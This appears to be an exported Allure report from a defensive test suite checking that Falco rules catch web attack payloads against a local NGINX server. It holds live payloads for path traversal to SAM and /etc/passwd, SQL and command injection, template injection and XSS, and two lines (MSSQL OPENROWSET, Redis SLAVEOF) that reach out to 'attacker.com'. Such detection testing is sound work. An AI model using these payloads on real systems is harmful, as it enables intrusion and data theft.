"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_WIN_003` |
| **Name** | Windows SAM file access |
| **Category** | PATH |
| **Subcategory** | windows_traversal |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `..\..\..\Windows\System32\config\SAM`
- **Encoded**: `..%5C..%5C..%5CWindows%5CSystem32%5Cconfig%5CSAM`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~68000ms
- **Timestamp**: 11:36:09.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Windows path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_003-1772192169077-docib pattern_id=PATH_WIN_003 uri=/?q=..%5C..%5C..%5CWindows%5CSystem32%5Cconfig%5CSAM client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_003-1772192169077-docib pattern_id=PATH_WIN_003 uri=/?q=..%5C..%5C..%5CWindows%5CSystem32%5Cconfig%5CSAM client=127.0.0.1

**Falco Log Entry**:
```
11:36:09.000000000: Critical [NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_003-1772192169077-docib pattern_id=PATH_WIN_003 uri=/?q=..%5C..%5C..%5CWindows%5CSystem32%5Cconfig%5CSAM client=127.0.0.1
```","2","test_e2e_with_logs[299_PATH_WIN_003]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_COMMENT_001` |
| **Name** | XPath comment injection |
| **Category** | XPATH |
| **Subcategory** | comment |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' or 1=1 (: XPath comment :)`
- **Encoded**: `%27%20or%201%3D1%20%28%3A%20XPath%20comment%20%3A%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~42000ms
- **Timestamp**: 11:36:35.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XPath Injection] XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_COMMENT_001-1772192195066-qvljv pattern_id=XPATH_COMMENT_001 uri=/?q=%27%20or%201%3D1%20%28%3A%20XPath%20comment%20%3A%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_COMMENT_001-1772192195066-qvljv pattern_id=XPATH_COMMENT_001 uri=/?q=%27%20or%201%3D1%20%28%3A%20XPath%20comment%20%3A%29 client=127.0.0.1

**Falco Log Entry**:
```
11:36:35.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_COMMENT_001-1772192195066-qvljv pattern_id=XPATH_COMMENT_001 uri=/?q=%27%20or%201%3D1%20%28%3A%20XPath%20comment%20%3A%29 client=127.0.0.1
```","2","test_e2e_with_logs[464_XPATH_COMMENT_001]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_006` |
| **Name** | Details tag XSS |
| **Category** | XSS |
| **Subcategory** | mutation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<details open ontoggle=alert('XSS')>`
- **Encoded**: `%3Cdetails%20open%20ontoggle%3Dalert('XSS')%3E`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[188_XSS_MUT_006]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_003` |
| **Name** | OR operator with id command |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `|| id`
- **Encoded**: `%7C%7C%20id`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~78000ms
- **Timestamp**: 11:35:59.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_003-1772192159036-ewergm pattern_id=CMD_BASIC_003 uri=/?q=%7C%7C%20id client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_003-1772192159036-ewergm pattern_id=CMD_BASIC_003 uri=/?q=%7C%7C%20id client=127.0.0.1

**Falco Log Entry**:
```
11:35:59.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_003-1772192159036-ewergm pattern_id=CMD_BASIC_003 uri=/?q=%7C%7C%20id client=127.0.0.1
```","1","test_e2e_with_logs[325_CMD_BASIC_003]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_002` |
| **Name** | URL encoded AND operator with ls |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%26%26%20ls%20-la`
- **Encoded**: `%2526%2526%2520ls%2520-la`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~62000ms
- **Timestamp**: 11:36:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1772192175582-drhj1 pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1772192175582-drhj1 pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:36:15.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1772192175582-drhj1 pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[350_CMD_ENC_002]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNI_002` |
| **Name** | UTF-8 slash encoding |
| **Category** | PATH |
| **Subcategory** | unicode |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `..%c0%af..%c0%af..%c0%afetc/passwd`
- **Encoded**: `..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 11:36:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_002-1772192185122-6pmndx pattern_id=PATH_UNI_002 uri=/?q=..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_002-1772192185122-6pmndx pattern_id=PATH_UNI_002 uri=/?q=..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
11:36:25.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_002-1772192185122-6pmndx pattern_id=PATH_UNI_002 uri=/?q=..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[284_PATH_UNI_002]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BLIND_001` |
| **Name** | Time-based blind command injection |
| **Category** | CMDINJ |
| **Subcategory** | blind_command_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `; sleep 10`
- **Encoded**: `%3B%20sleep%2010`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~67000ms
- **Timestamp**: 11:36:10.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_BLIND_001-1772192170565-yfrez6 pattern_id=CMD_BLIND_001 uri=/?q=%3B%20sleep%2010 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BLIND_001-1772192170565-yfrez6 pattern_id=CMD_BLIND_001 uri=/?q=%3B%20sleep%2010 client=127.0.0.1

**Falco Log Entry**:
```
11:36:10.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BLIND_001-1772192170565-yfrez6 pattern_id=CMD_BLIND_001 uri=/?q=%3B%20sleep%2010 client=127.0.0.1
```","1","test_e2e_with_logs[344_CMD_BLIND_001]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_2ND_002` |
| **Name** | Second-order boolean injection |
| **Category** | SQLI |
| **Subcategory** | second_order |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `user' OR '1'='1' --`
- **Encoded**: `user'%20OR%20'1'%3D'1'%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~76000ms
- **Timestamp**: 11:36:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_2ND_002-1772192161588-lxa96u pattern_id=SQLI_2ND_002 uri=/?q=user'%20OR%20'1'%3D'1'%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_2ND_002-1772192161588-lxa96u pattern_id=SQLI_2ND_002 uri=/?q=user'%20OR%20'1'%3D'1'%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:36:01.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_2ND_002-1772192161588-lxa96u pattern_id=SQLI_2ND_002 uri=/?q=user'%20OR%20'1'%3D'1'%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[002_SQLI_2ND_002]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNI_007` |
| **Name** | Mixed encoding traversal |
| **Category** | PATH |
| **Subcategory** | unicode |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `..%2f..%5c..%2fetc/passwd`
- **Encoded**: `..%252f..%255c..%252fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~50000ms
- **Timestamp**: 11:36:27.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_007-1772192187627-ctcso pattern_id=PATH_UNI_007 uri=/?q=..%252f..%255c..%252fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_007-1772192187627-ctcso pattern_id=PATH_UNI_007 uri=/?q=..%252f..%255c..%252fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
11:36:27.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_007-1772192187627-ctcso pattern_id=PATH_UNI_007 uri=/?q=..%252f..%255c..%252fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[289_PATH_UNI_007]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_NORM_001` |
| **Name** | Backslash normalization bypass |
| **Category** | PATH |
| **Subcategory** | normalization |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..\..\..\etc\passwd`
- **Encoded**: `..%5C..%5C..%5Cetc%5Cpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~63000ms
- **Timestamp**: 11:36:14.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_NORM_001-1772192174091-afsbm1 pattern_id=PATH_NORM_001 uri=/?q=..%5C..%5C..%5Cetc%5Cpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_NORM_001-1772192174091-afsbm1 pattern_id=PATH_NORM_001 uri=/?q=..%5C..%5C..%5Cetc%5Cpasswd client=127.0.0.1

**Falco Log Entry**:
```
11:36:14.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_NORM_001-1772192174091-afsbm1 pattern_id=PATH_NORM_001 uri=/?q=..%5C..%5C..%5Cetc%5Cpasswd client=127.0.0.1
```","2","test_e2e_with_logs[274_PATH_NORM_001]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_OOB_002` |
| **Name** | MSSQL OpenRowset Data Exfil |
| **Category** | SQLI |
| **Subcategory** | out_of_band |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; SELECT * FROM OPENROWSET('SQLOLEDB','attacker.com';'sa';'pwd','SELECT 1')--`
- **Encoded**: `'%3B%20SELECT%20*%20FROM%20OPENROWSET('SQLOLEDB'%2C'attacker.com'%3B'sa'%3B'pwd'%2C'SELECT%201')--`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[087_SQLI_OOB_002]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_010` |
| **Name** | Password length discovery via timing |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT CASE WHEN (LENGTH(password))>10 THEN SLEEP(5) ELSE 1 END) FROM users WHERE username='admin' --`
- **Encoded**: `'%20AND%20(SELECT%20CASE%20WHEN%20(LENGTH(password))%3E10%20THEN%20SLEEP(5)%20ELSE%201%20END)%20FROM%20users%20WHERE%20username%3D'admin'%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~56000ms
- **Timestamp**: 11:36:21.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_BLIND_010-1772192181139-csgb08 pattern_id=SQLI_BLIND_010 uri=/?q='%20AND%20(SELECT%20CASE%20WHEN%20(LENGTH(password))%3E10%20THEN%20SLEEP(5)%20ELSE%201%20END)%20FROM%20users%20WHERE%20username%3D'admin'%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_BLIND_010-1772192181139-csgb08 pattern_id=SQLI_BLIND_010 uri=/?q='%20AND%20(SELECT%20CASE%20WHEN%20(LENGTH(password))%3E10%20THEN%20SLEEP(5)%20ELSE%201%20END)%20FROM%20users%20WHERE%20username%3D'admin'%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:36:21.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_BLIND_010-1772192181139-csgb08 pattern_id=SQLI_BLIND_010 uri=/?q='%20AND%20(SELECT%20CASE%20WHEN%20(LENGTH(password))%3E10%20THEN%20SLEEP(5)%20ELSE%201%20END)%20FROM%20users%20WHERE%20username%3D'admin'%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[036_SQLI_BLIND_010]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_VEL_001` |
| **Name** | Velocity template runtime execution |
| **Category** | SSTI |
| **Subcategory** | velocity |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `#set($runtime = $runtime.getRuntime())$runtime.exec('whoami')`
- **Encoded**: `%23set%28%24runtime%20%3D%20%24runtime.getRuntime%28%29%29%24runtime.exec%28%27whoami%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~48000ms
- **Timestamp**: 11:36:29.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `Spring4Shell attack` |
| **Matched Rule** | `[NGINX Emerging Threat] Spring4Shell attack test_id=SSTI_VEL_001-1772192189537-cpujv8 pattern_id=SSTI_VEL_001 uri=/?q=%23set%28%24runtime%20%3D%20%24runtime.getRuntime%28%29%29%24runtime.exec%28%27whoami%27%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Spring4Shell attack test_id=SSTI_VEL_001-1772192189537-cpujv8 pattern_id=SSTI_VEL_001 uri=/?q=%23set%28%24runtime%20%3D%20%24runtime.getRuntime%28%29%29%24runtime.exec%28%27whoami%27%29 client=127.0.0.1

**Falco Log Entry**:
```
11:36:29.000000000: Critical [NGINX Emerging Threat] Spring4Shell attack test_id=SSTI_VEL_001-1772192189537-cpujv8 pattern_id=SSTI_VEL_001 uri=/?q=%23set%28%24runtime%20%3D%20%24runtime.getRuntime%28%29%29%24runtime.exec%28%27whoami%27%29 client=127.0.0.1
```","2","test_e2e_with_logs[690_SSTI_VEL_001]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `NOSQL_REDIS_003` |
| **Name** | Redis SLAVEOF Command Injection |
| **Category** | NOSQL_EXTENDED |
| **Subcategory** | redis |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `SLAVEOF attacker.com 6379`
- **Encoded**: `SLAVEOF%20attacker.com%206379`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~36000ms
- **Timestamp**: 11:36:41.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Redis command injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Redis command injection test_id=NOSQL_REDIS_003-1772192201556-shc36 pattern_id=NOSQL_REDIS_003 uri=/?q=SLAVEOF%20attacker.com%206379 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Redis command injection test_id=NOSQL_REDIS_003-1772192201556-shc36 pattern_id=NOSQL_REDIS_003 uri=/?q=SLAVEOF%20attacker.com%206379 client=127.0.0.1

**Falco Log Entry**:
```
11:36:41.000000000: Critical [NGINX Emerging Threat] Redis command injection test_id=NOSQL_REDIS_003-1772192201556-shc36 pattern_id=NOSQL_REDIS_003 uri=/?q=SLAVEOF%20attacker.com%206379 client=127.0.0.1
```","2","test_e2e_with_logs[661_NOSQL_REDIS_003]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_011` |
| **Name** | Tabindex onfocus XSS |
| **Category** | XSS |
| **Subcategory** | mutation_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<div id=x tabindex=0 onfocus=alert(1)>`
- **Encoded**: `%3Cdiv%20id%3Dx%20tabindex%3D0%20onfocus%3Dalert%281%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 11:36:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_011-1772192191161-h6v6hp pattern_id=XSS_MUT_011 uri=/?q=%3Cdiv%20id%3Dx%20tabindex%3D0%20onfocus%3Dalert%281%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_011-1772192191161-h6v6hp pattern_id=XSS_MUT_011 uri=/?q=%3Cdiv%20id%3Dx%20tabindex%3D0%20onfocus%3Dalert%281%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:36:31.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_011-1772192191161-h6v6hp pattern_id=XSS_MUT_011 uri=/?q=%3Cdiv%20id%3Dx%20tabindex%3D0%20onfocus%3Dalert%281%29%3E client=127.0.0.1 method=GET
```","3","test_e2e_with_logs[193_XSS_MUT_011]","allure","2026-02-27","passed","2026-02-27","","test_e2e_wrapper","",""
